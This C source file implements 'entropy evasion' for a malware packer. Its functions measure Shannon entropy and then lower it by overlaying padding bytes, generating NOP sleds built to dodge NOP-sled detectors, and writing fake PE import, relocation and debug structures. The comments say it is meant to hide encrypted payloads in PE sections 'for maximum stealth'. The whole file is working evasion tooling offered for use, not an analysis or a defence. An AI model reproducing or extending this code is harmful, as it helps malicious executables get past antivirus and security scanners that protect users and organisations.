#include "EntropyEvasion.h"

#include <math.h>
#include <string.h>

/* ================================================================
 * Internal PRNG — Xorshift32 for deterministic sequences
 * ================================================================ */

static inline uint32_t AxRandXorshift32(uint32_t* state)
{
    uint32_t x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

/* ================================================================
 * Entropy Calculation
 * ================================================================
 *
 * Shannon entropy: H = -sum(p_i * log2(p_i))
 * where p_i = count_i / total_bytes for each byte value 0..255.
 *
 * Maximum entropy for 8-bit values: log2(256) = 8.0 bits/byte
 * (all values equally probable).
 * Minimum entropy: 0.0 (single repeated value).
 */

float AxCalculateEntropy(const uint8_t* data, size_t size)
{
    if (!data || size == 0)
        return 0.0f;

    /* Count byte frequency */
    unsigned int freq[256];
    memset(freq, 0, sizeof(freq));

    for (size_t i = 0; i < size; i++) {
        freq[data[i]]++;
    }

    /* Compute Shannon entropy */
    double entropy = 0.0;
    const double inv_size = 1.0 / (double)size;

    for (int i = 0; i < 256; i++) {
        if (freq[i] > 0) {
            double p = (double)freq[i] * inv_size;
            entropy -= p * log2(p);
        }
    }

    return (float)entropy;
}

/* ================================================================
 * Internal: insert low-entropy padding at a pseudo-random offset
 *
 * Insert LOW_ENTROPY_BYTES count of bytes (0x00/0x90/0xCC) at a
 * pseudo-random position within the buffer, shifting the tail.
 *
 * This simulates normal compiler alignment padding that naturally
 * occurs in PE sections.
 * ================================================================ */

#define LOW_ENTROPY_BYTES  4
#define LOW_ENTROPY_SEED1  0x11111111U
#define LOW_ENTROPY_SEED2  0x22222222U
#define MAX_NORM_ITERATIONS 512

/* Padding byte weights: 0x00=55%, 0x90=20%, 0xCC=15%, others=10% */
static uint8_t AxPickPaddingByte(uint32_t* rng_state)
{
    uint32_t r = AxRandXorshift32(rng_state) % 100;
    if (r < 55)  return 0x00;
    if (r < 75)  return 0x90;
    if (r < 90)  return 0xCC;
    return (uint8_t)(AxRandXorshift32(rng_state) & 0xFF);
}

/*
 * Insert low-entropy bytes at pseudo-random offsets in the buffer.
 * We overlay a few bytes rather than shifting, to keep the size
 * constant and avoid buffer overflow.
 */
static void AxInsertLowEntropyRegion(uint8_t* data, size_t size, uint32_t* rng_state)
{
    if (size <= LOW_ENTROPY_BYTES)
        return;

    /* Pick a random offset that has room for LOW_ENTROPY_BYTES */
    uint32_t r = AxRandXorshift32(rng_state);
    size_t offset = (size_t)(r % (uint32_t)(size - LOW_ENTROPY_BYTES));

    for (size_t i = 0; i < LOW_ENTROPY_BYTES; i++) {
        data[offset + i] = AxPickPaddingByte(rng_state);
    }
}

/* ================================================================
 * Entropy Normalization
 * ================================================================
 *
 * Strategy:
 *   If current_entropy > target:
 *     Inject low-entropy bytes at pseudo-random offsets to dilute
 *     the high-entropy data. This is the common case for encrypted
 *     payloads (~7.5–8.0 native entropy).
 *
 *   If current_entropy < target (rare):
 *     Inject pseudo-random "junk" bytes at the end of the buffer
 *     to increase entropy.
 *
 * The function iteratively adjusts until the target is approximated
 * or the maximum iteration count is reached.
 *
 * Note: This modifies the buffer in-place. For maximum stealth, the
 * caller should invoke this AFTER embedding the encrypted payload
 * but BEFORE writing the final PE section.
 */

float AxNormalizeEntropy(uint8_t* data, size_t size, float target_entropy)
{
    if (!data || size == 0)
        return 0.0f;

    /* Clamp target to valid range */
    if (target_entropy < 4.0f)  target_entropy = 4.0f;
    if (target_entropy > 7.9f)  target_entropy = 7.9f;

    /* Initialize RNG from buffer hash for determinism */
    uint32_t seed = 0x9E3779B9U; /* golden ratio */
    for (size_t i = 0; i < size && i < 64; i++) {
        seed ^= (uint32_t)data[i] + (seed << 6) + (seed >> 2);
    }
    uint32_t rng_state = seed ^ 0xABCDEF01U;

    float current = AxCalculateEntropy(data, size);
    int iterations = 0;

    while (iterations < MAX_NORM_ITERATIONS) {
        float diff = current - target_entropy;

        /* Within acceptable tolerance? */
        if (diff > -0.05f && diff < 0.05f)
            break;

        if (diff > 0.0f) {
            /* Entropy too high — inject low-entropy padding */
            AxInsertLowEntropyRegion(data, size, &rng_state);
        } else {
            /* Entropy too low — inject pseudo-random bytes at end */
            if (size >= 8) {
                uint32_t r1 = AxRandXorshift32(&rng_state);
                uint32_t r2 = AxRandXorshift32(&rng_state);
                size_t offset = size - 8;
                data[offset + 0] = (uint8_t)(r1 & 0xFF);
                data[offset + 1] = (uint8_t)((r1 >> 8) & 0xFF);
                data[offset + 2] = (uint8_t)((r1 >> 16) & 0xFF);
                data[offset + 3] = (uint8_t)((r1 >> 24) & 0xFF);
                data[offset + 4] = (uint8_t)(r2 & 0xFF);
                data[offset + 5] = (uint8_t)((r2 >> 8) & 0xFF);
                data[offset + 6] = (uint8_t)((r2 >> 16) & 0xFF);
                data[offset + 7] = (uint8_t)((r2 >> 24) & 0xFF);
            }
        }

        current = AxCalculateEntropy(data, size);
        iterations++;
    }

    return current;
}

/* ================================================================
 * Low-Entropy Filling
 * ================================================================
 *
 * FillLowEntropy — fills a buffer with a pattern that mimics
 * MSVC compiler output/normal data sections.
 *
 * The distribution is:
 *   0x00 = 55%  — zero-initialized data / alignment padding
 *   0x90 = 20%  — NOP instructions (common in optimized code)
 *   0xCC = 15%  — INT3 (debug build padding, MSVC)
 *   rand = 10%  — sparse noise to avoid constant-byte detection
 *
 * Resulting entropy: ~1.0–3.0 (depends on buffer size and seed)
 */

void AxFillLowEntropy(uint8_t* buf, size_t size, uint32_t seed)
{
    if (!buf || size == 0)
        return;

    uint32_t rng_state = seed ^ 0xA5A5A5A5U;

    for (size_t i = 0; i < size; i++) {
        buf[i] = AxPickPaddingByte(&rng_state);
    }
}

/* ================================================================
 * FillNopSled — fill with 0x90 (NOP) dominant pattern, with
 * occasional realistic interleaving to evade NOP-sled detectors.
 *
 * Pattern: mostly 0x90, but every ~32-64 bytes, insert a byte that
 * looks like a valid instruction prefix, ModRM, or immediate value.
 *
 * Entropy: ~0.5–1.5
 */

void AxFillNopSled(uint8_t* buf, size_t size, uint32_t seed)
{
    if (!buf || size == 0)
        return;

    uint32_t rng_state = seed ^ 0xDEADBEEFU;

    /* Realistic looking instruction bytes that might follow a NOP sled */
    static const uint8_t realistic_bytes[] = {
        0x55,       /* push ebp */
        0x8B, 0xEC, /* mov ebp, esp */
        0x83, 0xEC, /* sub esp, XX */
        0x56,       /* push esi */
        0x57,       /* push edi */
        0x50,       /* push eax */
        0x53,       /* push ebx */
        0x51,       /* push ecx */
        0x52,       /* push edx */
        0x33, 0xC0, /* xor eax, eax */
        0x33, 0xD2, /* xor edx, edx */
        0xB8,       /* mov eax, imm32 */
        0xBA,       /* mov edx, imm32 */
        0xB9,       /* mov ecx, imm32 */
        0xE8,       /* call rel32 */
        0xEB,       /* jmp short */
        0x74,       /* je rel8 */
        0x75,       /* jne rel8 */
        0x7C,       /* jl rel8 */
        0x7F,       /* jg rel8 */
        0xC3,       /* ret */
        0xCC,       /* int3 */
        0x90,       /* nop */
        0xF3, 0x90, /* pause (rep nop) */
        0x0F, 0x1F, /* nop (multi-byte) */
    };

    size_t i = 0;
    while (i < size) {
        /* Default: NOP (0x90) */
        uint32_t r = AxRandXorshift32(&rng_state);

        if ((r % 64) == 0 && i + 1 < size) {
            /* Every ~64 bytes, insert 2 realistic instruction bytes */
            size_t idx = (r >> 8) % (sizeof(realistic_bytes) - 1);
            buf[i++] = realistic_bytes[idx];
            if (i < size)
                buf[i++] = realistic_bytes[idx + 1];
        } else if ((r % 32) == 0 && i < size) {
            /* Every ~32 bytes, insert 1 realistic byte */
            size_t idx = (r >> 16) % sizeof(realistic_bytes);
            buf[i++] = realistic_bytes[idx];
        } else {
            buf[i++] = 0x90;
        }
    }
}

/* ================================================================
 * FillNormalData — fill buffer with data resembling a typical
 * .rdata or .data section (import tables, string pointers, etc.)
 *
 * Creates patterns that look like:
 *   - IMAGE_IMPORT_DESCRIPTOR entries
 *   - Function pointer tables (thunk-style)
 *   - String pointers and data structures
 *   - PE-related constants
 *
 * Entropy: ~2.0–4.0
 */

void AxFillNormalData(uint8_t* buf, size_t size, uint32_t seed)
{
    if (!buf || size == 0)
        return;

    uint32_t rng_state = seed ^ 0xCAFEBABEU;

    size_t offset = 0;

    while (offset < size) {
        uint32_t r = AxRandXorshift32(&rng_state);
        uint32_t pattern_type = r % 6;

        switch (pattern_type) {
        case 0: {
            /* IMAGE_IMPORT_DESCRIPTOR-like structure (20 bytes) */
            if (offset + 20 > size) goto fill_remaining;
            /* OriginalFirstThunk */  buf[offset++] = (uint8_t)(r & 0xFF);        buf[offset++] = (uint8_t)((r >> 8) & 0xFF);
            buf[offset++] = (uint8_t)((r >> 16) & 0xFF); buf[offset++] = (uint8_t)((r >> 24) & 0xFF);
            /* TimeDateStamp */       buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00;
            /* ForwarderChain */      buf[offset++] = 0xFF; buf[offset++] = 0xFF; buf[offset++] = 0xFF; buf[offset++] = 0xFF;
            /* Name RVA */            buf[offset++] = (uint8_t)((r >> 4) & 0xFF); buf[offset++] = (uint8_t)((r >> 12) & 0xFF);
            buf[offset++] = (uint8_t)((r >> 20) & 0xFF); buf[offset++] = 0x00;
            /* FirstThunk */          buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00;
            break;
        }

        case 1: {
            /* Thunk table entry — IMAGE_THUNK_DATA32 (4 bytes) */
            if (offset + 4 > size) goto fill_remaining;
            uint32_t thunk = (r & 0x7FFFFFFF); /* Clear highest bit (ordinal flag) */
            thunk = (thunk & 0xFFFFF000) | 0x800; /* Looks like an RVA */
            buf[offset++] = (uint8_t)(thunk & 0xFF);
            buf[offset++] = (uint8_t)((thunk >> 8) & 0xFF);
            buf[offset++] = (uint8_t)((thunk >> 16) & 0xFF);
            buf[offset++] = (uint8_t)((thunk >> 24) & 0xFF);
            break;
        }

        case 2: {
            /* PEB-like structure / RTL_USER_PROCESS_PARAMETERS fragment */
            if (offset + 8 > size) goto fill_remaining;
            buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00; /* reserved */
            buf[offset++] = (uint8_t)(r & 0xFF); buf[offset++] = (uint8_t)((r >> 8) & 0xFF);         /* pointer-like */
            buf[offset++] = (uint8_t)((r >> 16) & 0xFF); buf[offset++] = (uint8_t)((r >> 24) & 0xFF);
            break;
        }

        case 3: {
            /* IMAGE_BASE_RELOCATION block (8 bytes) */
            if (offset + 8 > size) goto fill_remaining;
            /* VirtualAddress */       buf[offset++] = 0x00; buf[offset++] = 0x10; buf[offset++] = 0x00; buf[offset++] = 0x00;
            /* SizeOfBlock */          buf[offset++] = (uint8_t)((r >> 8) & 0xFF); buf[offset++] = (uint8_t)((r >> 16) & 0xFF); buf[offset++] = 0x00; buf[offset++] = 0x00;
            break;
        }

        case 4: {
            /* IMAGE_DEBUG_DIRECTORY (28 bytes) */
            if (offset + 28 > size) goto fill_remaining;
            /* Characteristics */      buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00;
            /* TimeDateStamp */        buf[offset++] = 0x5A; buf[offset++] = 0x4A; buf[offset++] = 0x12; buf[offset++] = 0x00; /* ~2018-ish */
            /* MajorVersion */         buf[offset++] = 0x0E; buf[offset++] = 0x00;
            /* MinorVersion */         buf[offset++] = 0x1E; buf[offset++] = 0x00;
            /* Type (2=CodeView) */    buf[offset++] = 0x02; buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00;
            /* SizeOfData */           buf[offset++] = 0x1C; buf[offset++] = 0x01; buf[offset++] = 0x00; buf[offset++] = 0x00;
            /* AddressOfRawData */     buf[offset++] = (uint8_t)(r & 0xFF); buf[offset++] = (uint8_t)((r >> 8) & 0xFF); buf[offset++] = (uint8_t)((r >> 16) & 0xFF); buf[offset++] = (uint8_t)((r >> 24) & 0xFF);
            /* PointerToRawData */     buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00; buf[offset++] = 0x00;
            break;
        }

        case 5:
        default: {
            /* String pointer table (4 or 8 bytes each) */
            if (offset + 4 > size) goto fill_remaining;
            uint32_t str_ptr = (r & 0x000FFFFF) | 0x00400000; /* Looks like a .rdata RVA */
            buf[offset++] = (uint8_t)(str_ptr & 0xFF);
            buf[offset++] = (uint8_t)((str_ptr >> 8) & 0xFF);
            buf[offset++] = (uint8_t)((str_ptr >> 16) & 0xFF);
            buf[offset++] = (uint8_t)((str_ptr >> 24) & 0xFF);
            break;
        }
        }
    }

    return;

fill_remaining:
    /* Fill any remaining bytes with 0x00 */
    while (offset < size) {
        buf[offset++] = 0x00;
    }
}

/* ================================================================
 * Compile-time camouflage utilities (helper functions for macros)
 * ================================================================
 *
 * These are called from the macros in EntropyEvasion.h at runtime
 * to actually write the padding data. The macros declare static
 * volatile arrays and loops; these functions provide the actual
 * computation for more complex operations.
 */

/* Generate a deterministic padding byte based on seed and position */
uint8_t AxEntropyPadByte(uint32_t base_seed, size_t index)
{
    uint32_t state = base_seed ^ (uint32_t)index;
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return (state & 0xFF) < 128 ? 0x00 :
           (state & 0xFF) < 200 ? 0x90 : 0xCC;
}

/* 
 * Generate a 32-bit "camouflage" value that looks like a valid
 * PE structure field when placed in .rdata.
 */
uint32_t AxEntropyCamouflageValue(uint32_t seed, size_t index)
{
    uint32_t state = seed ^ (uint32_t)(index * 0x9E3779B9U);
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    /* Produce a value that looks like an IMAGE_DATA_DIRECTORY entry */
    uint32_t va   = (state & 0x000FFFFF) | 0x00001000; /* RVA in low 1MB */
    uint32_t size = ((state >> 12) & 0x00000FFF) | 0x00000100; /* size ~256-4095 */
    return (va & 0xFFFF) | ((size & 0xFFFF) << 16);
}
